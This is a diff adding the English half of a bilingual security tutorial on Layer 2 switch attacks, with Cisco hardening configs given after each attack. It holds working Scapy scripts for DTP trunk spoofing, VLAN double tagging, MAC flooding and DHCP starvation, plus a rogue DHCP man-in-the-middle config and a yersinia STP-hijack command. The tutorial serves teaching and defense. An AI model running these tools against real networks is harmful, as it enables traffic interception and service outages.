@@ -544,3 +544,483 @@ interface GigabitEthernet0/23
 ## 10. 마무리
 
 Layer 2 공격은 "고전"이라는 말을 많이 듣지만, 2026년 현장 감사에서 위 기법들의 방어가 전부 잘 구성된 네트워크는 소수입니다. 다음 문서(03)에서는 더 상위 계층으로 올라가 **라우팅 프로토콜 공격**을 다룹니다 — OSPF LSA 주입, BGP 경로 가로채기, HSRP 하이재킹.
+
+---
+
+<a name="english"></a>
+
+# 32-02. Layer 2 Attacks — Collapsing Every Boundary Within the Same Switch Domain
+
+> **What this document covers**: Attacks possible with just one cable plugged into a switch port.
+> VLAN boundaries, STP trees, CAM tables, DHCP assignments, ARP caches — all of these are poorly defended on default-configured switches.
+
+## 1. Why Layer 2 Is Still a Problem
+
+Layer 2 was designed assuming a "trusted broadcast domain." In the 1990s, LANs really were trustworthy. The problem is that this philosophy is still the default in 2026.
+
+If an attacker occupies a **single access port**:
+
+- **Sniff all traffic** within the broadcast domain
+- **Jump across VLANs** to penetrate other departments' networks
+- **Seize the root bridge** and route all traffic through their port
+- Impersonate a DHCP server to set **default gateway to their own IP**
+
+The reason Layer 2 is most lethal in enterprise threat models is that **most defense settings ship disabled**. Cisco's DAI, DHCP Snooping, and BPDU Guard all come disabled.
+
+## 2. VLAN Concept Review — 802.1Q Frame Structure
+
+802.1Q tagged Ethernet frame:
+
+```
+┌─────────────┬─────────────┬───────────┬─────────────┬────────┬──────┬──────┐
+│ Dst MAC     │ Src MAC     │ TPID      │ TCI         │ EType  │ Data │ FCS  │
+│ 6 byte      │ 6 byte      │ 0x8100    │ 2 byte      │ 2 byte │      │      │
+└─────────────┴─────────────┴───────────┴─────────────┴────────┴──────┴──────┘
+                                          │
+                                          ▼
+                                ┌───┬───┬──────────────┐
+                                │PCP│DEI│   VLAN ID    │
+                                │ 3 │ 1 │   12 bit     │
+                                └───┴───┴──────────────┘
+```
+
+The key is **VLAN ID 12 bits = 0~4095**, with 0, 1, and 4095 reserved. Each switch port operates in **access mode** (accepts only one VLAN without tags) or **trunk mode** (forwards tagged frames from multiple VLANs).
+
+Trunks have a "native VLAN" concept — untagged frames are assumed to be native VLAN. This design is the root cause of **Double Tagging** attacks.
+
+## 3. VLAN Hopping Attack 1 — DTP (Switch Spoofing)
+
+### 3.1 Attack Principle
+
+Cisco switch default ports have **DTP (Dynamic Trunking Protocol)** set to "dynamic auto." This means **if the other end claims "I'm a trunk," it negotiates and converts to trunk**. An attacker impersonates a switch to make their port a trunk, then gains access to tagged frames from all VLANs.
+
+### 3.2 Building DTP Frames with Scapy
+
+```python
+#!/usr/bin/env python3
+"""dtp_hijack.py — DTP frame sender that negotiates target switch port into trunk mode."""
+from __future__ import annotations
+
+import argparse
+import time
+
+from scapy.all import sendp, Ether
+from scapy.contrib.dtp import DTP, DTPDomain, \
+    DTPStatus, DTPType, DTPNeighbor
+
+
+def build_dtp_frame(src_mac: str, domain: str = "") -> Ether:
+    """Build a DTP 'desirable' message."""
+    dst_mac = "01:00:0c:cc:cc:cc"
+
+    ether = Ether(src=src_mac, dst=dst_mac)
+    dtp = (
+        DTP(ver=1) /
+        DTPDomain(type=0x0001, length=len(domain) + 5, domain=domain.encode() + b"\x00") /
+        DTPStatus(type=0x0002, length=5, status=0x03) /           # Desirable
+        DTPType(type=0x0003, length=5, dtptype=0xa5) /            # ISL + 802.1Q
+        DTPNeighbor(type=0x0004, length=10, neighbor=src_mac.replace(":", ""))
+    )
+    return ether / dtp
+
+
+def main() -> None:
+    ap = argparse.ArgumentParser()
+    ap.add_argument("-i", "--iface", required=True, help="attacker NIC (plugged into access port)")
+    ap.add_argument("-s", "--src-mac", required=True, help="source MAC")
+    ap.add_argument("-d", "--domain", default="", help="VTP domain name")
+    ap.add_argument("-n", "--count", type=int, default=6)
+    args = ap.parse_args()
+
+    frame = build_dtp_frame(args.src_mac, args.domain)
+
+    for i in range(args.count):
+        sendp(frame, iface=args.iface, verbose=False)
+        print(f"[+] DTP frame sent ({i+1}/{args.count})")
+        time.sleep(30)
+
+    print("[*] Check for trunk traffic (multiple VLAN tags) in Wireshark after a few minutes")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### 3.3 What You Can Do After Becoming a Trunk
+
+Once the port becomes a trunk, create VLAN sub-interfaces on Linux:
+
+```bash
+# Create sub-interface for VLAN 10
+sudo ip link add link eth0 name eth0.10 type vlan id 10
+sudo ip link set dev eth0.10 up
+sudo dhclient eth0.10      # Get IP from DHCP server in VLAN 10
+
+# Now eth0.10 interface participates in VLAN 10 network
+```
+
+### 3.4 Defense — One Line Is Enough
+
+```
+interface range GigabitEthernet0/1 - 24
+ switchport mode access
+ switchport nonegotiate    ! Disable DTP entirely — the most reliable defense
+```
+
+## 4. VLAN Hopping Attack 2 — Double Tagging
+
+### 4.1 Attack Principle
+
+The trunk's **native VLAN** passes through without tags. When an attacker sends a double-tagged frame with the outer tag as native VLAN and the inner tag as the victim VLAN:
+
+```
+[Native VLAN tag] [Victim VLAN tag] [Actual payload]
+        ↓                  ↓
+  First switch: native VLAN, so strips tag
+  Only second tag remains
+        ↓
+  Second switch: sees victim VLAN tag and forwards to that VLAN
+```
+
+Result: Attacker **crosses the VLAN boundary once** and injects frames into victim VLAN nodes. The downside is it's **one-directional** (can't receive responses). But for UDP-based attacks or blind RCE, it's sufficiently lethal.
+
+### 4.2 Scapy Implementation
+
+```python
+#!/usr/bin/env python3
+"""vlan_double_tag.py — Inject frames into another VLAN via native VLAN."""
+from __future__ import annotations
+
+import argparse
+
+from scapy.all import sendp, Ether, Dot1Q, IP, ICMP, Raw
+
+
+def build_double_tagged(
+    src_mac: str,
+    outer_vlan: int,
+    inner_vlan: int,
+    src_ip: str,
+    dst_ip: str,
+    payload: bytes,
+) -> Ether:
+    """Build frame with nested outer VLAN tag (native) and inner VLAN tag (victim)."""
+    dst_mac = "ff:ff:ff:ff:ff:ff"
+
+    frame = (
+        Ether(src=src_mac, dst=dst_mac) /
+        Dot1Q(vlan=outer_vlan) /          # tag to be stripped
+        Dot1Q(vlan=inner_vlan) /          # surviving tag
+        IP(src=src_ip, dst=dst_ip) /
+        ICMP() /
+        Raw(load=payload)
+    )
+    return frame
+
+
+def main() -> None:
+    ap = argparse.ArgumentParser()
+    ap.add_argument("-i", "--iface", required=True)
+    ap.add_argument("--src-mac", required=True)
+    ap.add_argument("--outer", type=int, required=True, help="outer VLAN — must match trunk native VLAN")
+    ap.add_argument("--inner", type=int, required=True, help="inner VLAN — victim VLAN")
+    ap.add_argument("--src-ip", required=True)
+    ap.add_argument("--dst-ip", required=True)
+    ap.add_argument("--payload", default="ATTACK-PROBE")
+    args = ap.parse_args()
+
+    frame = build_double_tagged(
+        args.src_mac, args.outer, args.inner,
+        args.src_ip, args.dst_ip, args.payload.encode(),
+    )
+
+    sendp(frame, iface=args.iface, count=10, verbose=True)
+    print("[*] Check for 'ATTACK-PROBE' string on mirrored port or victim host")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### 4.3 Defense — Make Native VLAN a "Garbage VLAN"
+
+```
+! Designate a VLAN never used for real traffic as native
+vlan 999
+ name UNUSED_NATIVE
+interface range GigabitEthernet0/23 - 24
+ switchport trunk native vlan 999
+ switchport trunk allowed vlan remove 999   ! Remove native VLAN from trunk allowed list
+ ! Or more strongly — force tagging of native VLAN
+ switchport trunk native vlan tag
+```
+
+## 5. CAM Table Overflow (MAC Flooding)
+
+### 5.1 Attack Principle
+
+A switch's CAM (Content Addressable Memory) table has limited size. If an attacker floods with **tens of thousands of fake source MACs**, the table fills up and the switch starts **flooding frames with unknown destination MACs to all ports** (acting like a hub). Result: traffic from other ports becomes visible on the attacker's port.
+
+### 5.2 Scapy Implementation — macof Alternative
+
+```python
+#!/usr/bin/env python3
+"""mac_flood.py — Random MAC frame generator to trigger CAM table overflow."""
+from __future__ import annotations
+
+import argparse
+import os
+import random
+import time
+
+from scapy.all import sendp, Ether, IP, UDP, Raw, RandMAC, RandIP
+
+
+def flood(iface: str, rate: int, duration: int) -> None:
+    start = time.time()
+    sent = 0
+
+    batch_size = 200
+    while time.time() - start < duration:
+        batch = [
+            Ether(src=str(RandMAC()), dst="ff:ff:ff:ff:ff:ff") /
+            IP(src=str(RandIP()), dst=str(RandIP())) /
+            UDP(sport=random.randint(1024, 65535), dport=random.randint(1024, 65535)) /
+            Raw(load=os.urandom(60))
+            for _ in range(batch_size)
+        ]
+        sendp(batch, iface=iface, verbose=False)
+        sent += batch_size
+
+        elapsed = time.time() - start
+        expected = elapsed * rate
+        if sent > expected:
+            time.sleep(0.01)
+
+    print(f"[+] {sent} frames sent in {duration}s (~{sent/duration:.0f} fps)")
+
+
+def main() -> None:
+    ap = argparse.ArgumentParser()
+    ap.add_argument("-i", "--iface", required=True)
+    ap.add_argument("-r", "--rate", type=int, default=5000)
+    ap.add_argument("-t", "--duration", type=int, default=30)
+    args = ap.parse_args()
+
+    flood(args.iface, args.rate, args.duration)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### 5.3 Defense — Port Security
+
+```
+interface GigabitEthernet0/1
+ switchport port-security                          ! Enable feature
+ switchport port-security maximum 2                ! Max 2 MACs per port
+ switchport port-security mac-address sticky       ! Stick first seen MAC
+ switchport port-security violation restrict       ! On violation, block only that MAC
+```
+
+`shutdown` mode disables the port which is operationally burdensome. `restrict` is the practical compromise.
+
+## 6. DHCP Starvation + Rogue DHCP
+
+### 6.1 Attack Flow
+
+1. **Starvation**: Attacker sends massive DHCPDISCOVER with fake MACs, exhausting the DHCP pool. Legitimate users can't get IPs.
+2. **Rogue DHCP**: Attacker sets up their own DHCP server and responds with their IP as the default gateway/DNS. All traffic from new clients passes through them.
+
+### 6.2 Scapy-based DHCP Starvation
+
+```python
+#!/usr/bin/env python3
+"""dhcp_starvation.py — DISCOVER flood that exhausts the DHCP pool."""
+from __future__ import annotations
+
+import argparse
+import random
+import time
+
+from scapy.all import sendp, Ether, IP, UDP, BOOTP, DHCP, RandMAC
+
+
+def random_xid() -> int:
+    return random.randint(0, 0xFFFFFFFF)
+
+
+def dhcp_discover(src_mac: str) -> Ether:
+    frame = (
+        Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
+        IP(src="0.0.0.0", dst="255.255.255.255") /
+        UDP(sport=68, dport=67) /
+        BOOTP(
+            chaddr=bytes.fromhex(src_mac.replace(":", "")) + b"\x00" * 10,
+            xid=random_xid(),
+            flags=0x8000,
+        ) /
+        DHCP(options=[
+            ("message-type", "discover"),
+            ("param_req_list", [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121]),
+            "end",
+        ])
+    )
+    return frame
+
+
+def main() -> None:
+    ap = argparse.ArgumentParser()
+    ap.add_argument("-i", "--iface", required=True)
+    ap.add_argument("-r", "--rate", type=float, default=5.0)
+    ap.add_argument("-t", "--duration", type=int, default=60)
+    args = ap.parse_args()
+
+    interval = 1.0 / args.rate
+    end = time.time() + args.duration
+    count = 0
+
+    while time.time() < end:
+        fake_mac = str(RandMAC())
+        sendp(dhcp_discover(fake_mac), iface=args.iface, verbose=False)
+        count += 1
+        time.sleep(interval)
+
+    print(f"[+] {count} DISCOVER sent in {args.duration}s")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### 6.3 Setting Up Rogue DHCP
+
+Running an actual Rogue DHCP server is simplest with **`dnsmasq`**:
+
+```bash
+sudo apt install dnsmasq
+
+cat > /tmp/dnsmasq-rogue.conf <<EOF
+interface=eth0
+dhcp-range=10.0.0.100,10.0.0.200,12h
+dhcp-option=option:router,10.0.0.250        # Attacker IP as gateway
+dhcp-option=option:dns-server,10.0.0.250    # DNS also attacker IP
+EOF
+
+sudo dnsmasq -C /tmp/dnsmasq-rogue.conf --no-daemon --log-dhcp
+```
+
+Enable `echo 1 > /proc/sys/net/ipv4/ip_forward` and set up iptables NAT or packet inspection for complete MITM.
+
+### 6.4 Defense — DHCP Snooping
+
+```
+! Global activation
+ip dhcp snooping
+ip dhcp snooping vlan 10,20,30
+
+! Only trust interfaces with legitimate DHCP servers
+interface GigabitEthernet0/24
+ description DHCP_SERVER_UPLINK
+ ip dhcp snooping trust
+
+! Other ports automatically 'untrusted' — blocks client sending server responses
+! Also blocks DHCP Starvation by checking source MAC != chaddr
+ip dhcp snooping verify mac-address
+```
+
+## 7. ARP Spoofing + DAI (Dynamic ARP Inspection) Bypass
+
+### 7.1 Basic ARP Spoofing in Section 02
+
+Basic ARP spoofing concept was covered in section 02, so here we focus on **bypassing DAI in environments where it's enabled**.
+
+### 7.2 How DAI Works
+
+When DHCP Snooping creates a binding table, DAI checks whether the **MAC↔IP mapping in ARP responses** from each port matches the binding. Non-matching responses are dropped.
+
+### 7.3 Bypass Ideas
+
+- **VLANs without DHCP Snooping**: DAI depends on DHCP Snooping bindings, so VLANs without snooping pass automatically if there's no static ARP ACL.
+- **Static ARP entries**: Manually assigned entries may not be in the binding table. Static ACL is needed but often omitted.
+- **Trusted ports**: If an admin marked a port as trusted out of convenience, an attacker on that port can freely manipulate ARP responses.
+
+### 7.4 Complete L2 Defense Stack — Practical Template
+
+```
+! 1. DHCP Snooping
+ip dhcp snooping
+ip dhcp snooping vlan 10,20,30
+ip dhcp snooping verify mac-address
+
+! 2. DAI
+ip arp inspection vlan 10,20,30
+ip arp inspection validate src-mac dst-mac ip
+ip arp inspection log-buffer entries 1024
+
+! 3. IP Source Guard — prevents IP spoofing using same binding table
+interface range GigabitEthernet0/1 - 23
+ ip verify source port-security
+
+! 4. Port Security
+interface range GigabitEthernet0/1 - 23
+ switchport port-security maximum 2
+ switchport port-security violation restrict
+ switchport port-security mac-address sticky
+
+! 5. BPDU Guard — drop port if BPDU arrives on access port
+interface range GigabitEthernet0/1 - 23
+ spanning-tree portfast
+ spanning-tree bpduguard enable
+
+! 6. Storm Control — limit broadcast flooding
+interface range GigabitEthernet0/1 - 23
+ storm-control broadcast level 1.00
+ storm-control action shutdown
+```
+
+## 8. STP Root Bridge Hijacking
+
+### 8.1 Concept
+
+Spanning Tree elects the switch with the lowest Bridge ID as root. If an attacker forges BPDUs claiming **Bridge Priority 0**, they become root. Result: certain traffic flows within the network are redesigned to pass through the attacker's port.
+
+### 8.2 Yersinia One-liner
+
+Direct implementation is possible but **yersinia** is fastest:
+
+```bash
+sudo yersinia -I
+
+# Or one-liner CLI:
+sudo yersinia stp -attack 4 -interface eth0
+```
+
+### 8.3 Defense — BPDU Guard + Root Guard
+
+- **BPDU Guard**: When BPDU arrives on access port, put it into err-disabled state
+- **Root Guard**: When a "superior" BPDU arrives on a specific port, put it in "root-inconsistent" state (set on ports that should face the root)
+
+```
+interface GigabitEthernet0/1
+ spanning-tree bpduguard enable     ! access port
+interface GigabitEthernet0/23
+ spanning-tree guard root           ! downlink port
+```
+
+## 9. 2026 Latest CVE — Catalyst DHCP Snooping BOOTP Leak
+
+CVE-2026-20084 disclosed in March 2026 involves **BOOTP packets leaking between VLANs where DHCP Snooping is enabled** on unpatched Catalyst 9000 devices. When an attacker sends specially crafted BOOTP requests from VLAN 10, another VLAN's switch CPU processes them causing high load → DoS.
+
+**Reproduction conditions**:
+- Catalyst 9000 series, IOS XE 17.x (specific versions)
+- `ip dhcp snooping` enabled + multiple VLANs
+
+**Defense**:
+- Upgrade to Cisco PSIRT recommended version (IOS XE 17.15.x, etc.)
+- Or temporarily disable DHCP Snooping on affected VLANs and use port-security + DAI static ACL as alternative controls
+
+## 10. Conclusion
+
+Layer 2 attacks are often called "classics," but in 2026 field audits, networks with all the above defenses properly configured are a minority. The next document (03) moves to a higher layer to cover **routing protocol attacks** — OSPF LSA injection, BGP route hijacking, HSRP hijacking.
